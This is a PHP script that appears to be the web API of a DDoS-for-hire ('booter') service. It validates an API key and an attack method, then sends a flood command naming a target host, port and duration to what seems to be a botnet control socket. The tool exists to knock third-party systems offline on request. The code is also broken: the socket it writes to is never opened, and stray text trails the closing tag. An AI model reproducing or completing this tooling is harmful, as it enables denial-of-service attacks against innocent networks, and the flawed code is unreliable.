<?php

// Read attack methods from attack-methods.config
$attackMethods = file(__DIR__ . '/Config/attack-methods.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Read API keys from api-keys.config
$APIKeys = file(__DIR__ . '/Config/api-keys.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Read banned IPs from banned-ips.config
$bannedIPs = file(__DIR__ . '/Config/banned-ips.config', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

function htmlsc($string)
{
    return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
}

if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
    die("<p>You are missing a parameter</p>");

$key = htmlsc($_GET["key"]);
$host = htmlsc($_GET["host"]);
$port = htmlsc($_GET["port"]);
$method = htmlsc(strtoupper($_GET["method"]));
$time = htmlsc($_GET["time"]);
$command = "";

// Check if API key is valid
if (!in_array($key, $APIKeys))
    die("Invalid API key");

// Check if attack method is valid
if (!in_array($method, $attackMethods))
    die("Invalid attack method");

// Check if client IP is banned
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIPs))
    die("<p>Your IP has been banned. If you believe this is a mistake, please contact the owner.</p>");

// Generate attack command
$command = "!* $method $host $port $time 32 1337 1";

($socket ? null : die("<p>Failed to connect</p>"));

fwrite($socket, $command . "\n");
fclose($socket);
echo htmlsc("Attack sent to $host:$port for $time seconds using method $method!\n");
?>s
